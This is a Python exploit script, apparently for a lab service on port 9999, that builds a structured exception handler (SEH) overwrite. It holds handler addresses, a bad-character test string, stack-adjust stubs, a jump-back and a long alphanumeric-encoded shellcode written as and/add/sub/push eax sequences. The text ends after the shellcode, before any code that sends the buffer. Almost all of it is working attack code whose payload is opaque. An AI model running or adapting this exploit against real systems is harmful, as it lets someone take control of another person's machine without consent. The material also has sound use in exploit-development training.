#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.219"
port = 9999

seh="\x2b\x17\x50\x62"
nseh="\x74\x06\x75\x04"

#badchar= '\x00'
badchar = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

#-------------------------------------ESP adjust 1  and shellcode-alpha----------------------------
#espadjust= "push esp; pop eax; add ax,0x1169; add al,0x7f; push eax; pop esp;
espadjust="\x54\x58\x66\x05\x69\x11\x04\x7F\x50\x5C"

#alpha1= alphanumeric shellcode of "\xeb\x80\x90\x90"
alpha1 = "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
alpha1 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
alpha1 += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
alpha1 += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
alpha1 += "\x50"

#--------------------------------------ESP adjust 2 and long jumpback------------------------------------------------------------
#PUSH ESP;POP EAX;SUB AL,0x32;PUSH EAX	;POP ESP                                                             

longjump= "\x54\x58\x2c\x32\x50\x5C"

#alpha2=PUSH ESP; POP EBX; SUB EBX,0xDBA; CALL EBX;
#alpha2="\x54\x5B\x81\xEB\xBA\x0D\x00\x00\xFF\xD3"
alpha2 ="\x54\x5B"
alpha2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
alpha2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
alpha2 += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
alpha2 += "\x05\x11\x11\x66\x62" ## add  eax, 0x62661111
alpha2 += "\x05\x11\x11\x55\x42" ## add  eax, 0x42551111
alpha2 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
alpha2 += "\x50"                 ## push eax
alpha2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
alpha2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
alpha2 += "\x05\x41\x76\x65\x07" ## add  eax, 0x07657641
alpha2 += "\x05\x40\x75\x55\x06" ## add  eax, 0x06557540
alpha2 += "\x50"                 ## push eax
#-----------------------------------------------SHELLCODE------------------------------------------------------
lastadjust="\x54\x58\x2c\x47\x50\x5C"

shellcode = "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x51\x25\x50\x50" ## add  eax, 0x50502551
shellcode += "\x05\x41\x15\x40\x40" ## add  eax, 0x40401541
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x51\x77\x44\x35" ## add  eax, 0x35447751
shellcode += "\x05\x41\x77\x44\x34" ## add  eax, 0x34447741
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x74\x45\x33\x65" ## add  eax, 0x65334574
shellcode += "\x05\x64\x34\x33\x54" ## add  eax, 0x54333464
shellcode += "\x05\x54\x34\x33\x34" ## add  eax, 0x34333454
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x66\x66\x33\x63" ## add  eax, 0x63336666
shellcode += "\x05\x56\x56\x42\x63" ## add  eax, 0x63425656
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x34\x46\x76\x62" ## add  eax, 0x62764634
shellcode += "\x05\x23\x45\x65\x51" ## add  eax, 0x51654523
shellcode += "\x05\x23\x44\x54\x42" ## add  eax, 0x42544423
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x26\x17\x73\x25" ## add  eax, 0x25731726
shellcode += "\x05\x25\x26\x62\x24" ## add  eax, 0x24622625
shellcode += "\x05\x26\x15\x52\x24" ## add  eax, 0x24521526
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x32\x46\x14\x73" ## add  eax, 0x73144632
shellcode += "\x05\x31\x45\x24\x63" ## add  eax, 0x63244531
shellcode += "\x05\x22\x44\x14\x52" ## add  eax, 0x52144422
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x65\x21\x24\x53" ## add  eax, 0x53242165
shellcode += "\x05\x55\x10\x24\x54" ## add  eax, 0x54241055
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x45\x36\x60\x47" ## add  eax, 0x47603645
shellcode += "\x05\x45\x45\x60\x46" ## add  eax, 0x46604545
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x75\x32\x05\x03" ## add  eax, 0x03053275
shellcode += "\x05\x74\x42\x04\x02" ## add  eax, 0x02044274
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x37\x30\x30\x73" ## add  eax, 0x73303037
shellcode += "\x05\x46\x40\x40\x64" ## add  eax, 0x64404046
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x41\x23\x37\x63" ## add  eax, 0x63372341
shellcode += "\x05\x41\x13\x26\x63" ## add  eax, 0x63261341
shellcode += "\x05\x31\x22\x25\x43" ## add  eax, 0x43252231
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x32\x57\x33" ## add  eax, 0x33573233
shellcode += "\x05\x23\x32\x46\x33" ## add  eax, 0x33463223
shellcode += "\x05\x22\x22\x45\x33" ## add  eax, 0x33452222
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x20\x55\x33" ## add  eax, 0x33552033
shellcode += "\x05\x33\x20\x54\x33" ## add  eax, 0x33542033
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x44\x44\x26\x47" ## add  eax, 0x47264444
shellcode += "\x05\x44\x44\x26\x46" ## add  eax, 0x46264444
shellcode += "\x05\x34\x34\x24\x45" ## add  eax, 0x45243434
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x24\x32\x63" ## add  eax, 0x63322467
shellcode += "\x05\x66\x13\x22\x53" ## add  eax, 0x53221366
shellcode += "\x05\x45\x23\x22\x42" ## add  eax, 0x42222345
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x44\x35\x53\x31" ## add  eax, 0x31533544
shellcode += "\x05\x44\x34\x42\x31" ## add  eax, 0x31423444
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x03\x17\x51\x55" ## add  eax, 0x55511703
shellcode += "\x05\x04\x16\x50\x55" ## add  eax, 0x55501604
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x26\x05\x61\x31" ## add  eax, 0x31610526
shellcode += "\x05\x15\x04\x50\x21" ## add  eax, 0x21500415
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x44\x24\x47" ## add  eax, 0x47244463
shellcode += "\x05\x53\x43\x14\x46" ## add  eax, 0x46144353
shellcode += "\x05\x43\x33\x23\x45" ## add  eax, 0x45233343
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x17\x66\x34\x20" ## add  eax, 0x20346617
shellcode += "\x05\x07\x56\x34\x20" ## add  eax, 0x20345607
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x13\x01\x25\x65" ## add  eax, 0x65250113
shellcode += "\x05\x14\x01\x25\x54" ## add  eax, 0x54250114
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x71\x66\x57\x02" ## add  eax, 0x02576671
shellcode += "\x05\x60\x65\x47\x02" ## add  eax, 0x02476560
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x54\x32\x65\x22" ## add  eax, 0x22653254
shellcode += "\x05\x54\x21\x64\x21" ## add  eax, 0x21642154
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x25\x62\x05\x02" ## add  eax, 0x02056225
shellcode += "\x05\x14\x52\x04\x02" ## add  eax, 0x02045214
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x13\x17\x17\x23" ## add  eax, 0x23171713
shellcode += "\x05\x12\x07\x06\x23" ## add  eax, 0x23060712
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x32\x27\x67" ## add  eax, 0x67273263
shellcode += "\x05\x53\x22\x26\x56" ## add  eax, 0x56262253
shellcode += "\x05\x42\x22\x25\x45" ## add  eax, 0x45252242
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x16\x13\x16\x13" ## add  eax, 0x13161316
shellcode += "\x05\x16\x13\x15\x03" ## add  eax, 0x03151316
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x53\x41\x65\x34" ## add  eax, 0x34654153
shellcode += "\x05\x53\x40\x65\x24" ## add  eax, 0x24654053
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x23\x16\x57\x34" ## add  eax, 0x34571623
shellcode += "\x05\x13\x15\x46\x33" ## add  eax, 0x33461513
shellcode += "\x05\x23\x13\x45\x23" ## add  eax, 0x23451323
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x16\x62\x53" ## add  eax, 0x53621667
shellcode += "\x05\x56\x15\x62\x43" ## add  eax, 0x43621556
shellcode += "\x05\x35\x16\x42\x43" ## add  eax, 0x43421635
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x17\x34\x44\x14" ## add  eax, 0x14443417
shellcode += "\x05\x16\x23\x34\x14" ## add  eax, 0x14342316
shellcode += "\x05\x15\x23\x33\x14" ## add  eax, 0x14332315
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x17\x67\x57\x36" ## add  eax, 0x36576717
shellcode += "\x05\x06\x67\x47\x25" ## add  eax, 0x25476706
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x31\x24\x16\x37" ## add  eax, 0x37162431
shellcode += "\x05\x31\x14\x25\x36" ## add  eax, 0x36251431
shellcode += "\x05\x31\x23\x16\x25" ## add  eax, 0x25162331
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x22\x07\x26\x42" ## add  eax, 0x42260722
shellcode += "\x05\x22\x06\x26\x41" ## add  eax, 0x41260622
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x16\x33\x63\x60" ## add  eax, 0x60633316
shellcode += "\x05\x15\x33\x52\x60" ## add  eax, 0x60523315
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x72\x43\x45\x15" ## add  eax, 0x15454372
shellcode += "\x05\x62\x33\x44\x14" ## add  eax, 0x14443362
shellcode += "\x05\x52\x33\x34\x14" ## add  eax, 0x14343352
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x02\x57\x20\x43" ## add  eax, 0x43205702
shellcode += "\x05\x01\x47\x20\x42" ## add  eax, 0x42204701
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x54\x77\x50\x12" ## add  eax, 0x12507754
shellcode += "\x05\x54\x66\x40\x12" ## add  eax, 0x12406654
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x37\x25\x60\x45" ## add  eax, 0x45602537
shellcode += "\x05\x46\x25\x60\x45" ## add  eax, 0x45602546
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x76\x41\x21\x33" ## add  eax, 0x33214176
shellcode += "\x05\x65\x42\x21\x33" ## add  eax, 0x33214265
shellcode += "\x05\x54\x31\x21\x32" ## add  eax, 0x32213154
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x54\x71\x03\x26" ## add  eax, 0x26037154
shellcode += "\x05\x54\x60\x03\x26" ## add  eax, 0x26036054
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x14\x51\x17\x44" ## add  eax, 0x44175114
shellcode += "\x05\x13\x41\x16\x43" ## add  eax, 0x43164113
shellcode += "\x05\x13\x41\x15\x33" ## add  eax, 0x33154113
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x26\x63\x47\x44" ## add  eax, 0x44476326
shellcode += "\x05\x15\x62\x46\x34" ## add  eax, 0x34466215
shellcode += "\x05\x24\x42\x45\x33" ## add  eax, 0x33454224
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x52\x65\x34\x33" ## add  eax, 0x33346552
shellcode += "\x05\x51\x64\x24\x44" ## add  eax, 0x44246451
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x76\x31\x66\x25" ## add  eax, 0x25663176
shellcode += "\x05\x65\x32\x55\x24" ## add  eax, 0x24553265
shellcode += "\x05\x54\x21\x46\x24" ## add  eax, 0x24462154
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x32\x63\x67\x04" ## add  eax, 0x04676332
shellcode += "\x05\x21\x63\x56\x04" ## add  eax, 0x04566321
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x57\x76\x27\x64" ## add  eax, 0x64277657
shellcode += "\x05\x47\x75\x16\x64" ## add  eax, 0x64167547
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x34\x33\x36\x47" ## add  eax, 0x47363334
shellcode += "\x05\x24\x33\x35\x46" ## add  eax, 0x46353324
shellcode += "\x05\x24\x23\x26\x45" ## add  eax, 0x45262324
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x43\x72\x13\x42" ## add  eax, 0x42137243
shellcode += "\x05\x43\x62\x23\x31" ## add  eax, 0x31236243
shellcode += "\x05\x42\x52\x12\x32" ## add  eax, 0x32125242
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x21\x65\x63\x45" ## add  eax, 0x45636521
shellcode += "\x05\x11\x65\x62\x44" ## add  eax, 0x44626511
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x30\x52\x36\x12" ## add  eax, 0x12365230
shellcode += "\x05\x30\x51\x26\x11" ## add  eax, 0x11265130
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x42\x34\x33" ## add  eax, 0x33344211
shellcode += "\x05\x01\x42\x44\x34" ## add  eax, 0x34444201
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x55\x31\x53\x77" ## add  eax, 0x77533155
shellcode += "\x05\x44\x30\x43\x77" ## add  eax, 0x77433044
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x03\x56\x57\x71" ## add  eax, 0x71575603
shellcode += "\x05\x03\x56\x46\x60" ## add  eax, 0x60465603
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x55\x53\x61\x67" ## add  eax, 0x67615355
shellcode += "\x05\x54\x53\x50\x66" ## add  eax, 0x66505354
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x27\x22\x61" ## add  eax, 0x61222733
shellcode += "\x05\x32\x26\x21\x52" ## add  eax, 0x52212632
shellcode += "\x05\x32\x25\x22\x41" ## add  eax, 0x41222532
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x66\x44\x63\x27" ## add  eax, 0x27634466
shellcode += "\x05\x55\x43\x63\x26" ## add  eax, 0x26634355
shellcode += "\x05\x66\x33\x43\x25" ## add  eax, 0x25433366
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x20\x01\x66\x52" ## add  eax, 0x52660120
shellcode += "\x05\x10\x01\x66\x42" ## add  eax, 0x42660110
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x71\x74\x63" ## add  eax, 0x63747146
shellcode += "\x05\x46\x62\x63\x53" ## add  eax, 0x53636246
shellcode += "\x05\x34\x51\x53\x62" ## add  eax, 0x62535134
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x32\x42\x76\x43" ## add  eax, 0x43764232
shellcode += "\x05\x31\x41\x66\x43" ## add  eax, 0x43664131
shellcode += "\x05\x22\x32\x54\x42" ## add  eax, 0x42543222
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x47\x45\x64\x12" ## add  eax, 0x12644547
shellcode += "\x05\x46\x34\x54\x21" ## add  eax, 0x21543446
shellcode += "\x05\x45\x34\x33\x12" ## add  eax, 0x12333445
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x37\x73\x33\x55" ## add  eax, 0x55337337
shellcode += "\x05\x27\x62\x42\x45" ## add  eax, 0x45426227
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x50\x61\x52\x22" ## add  eax, 0x22526150
shellcode += "\x05\x50\x61\x41\x21" ## add  eax, 0x21416150
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x43\x06\x14\x33" ## add  eax, 0x33140643
shellcode += "\x05\x42\x05\x04\x44" ## add  eax, 0x44040542
shellcode += "\x50"                 ## push eax
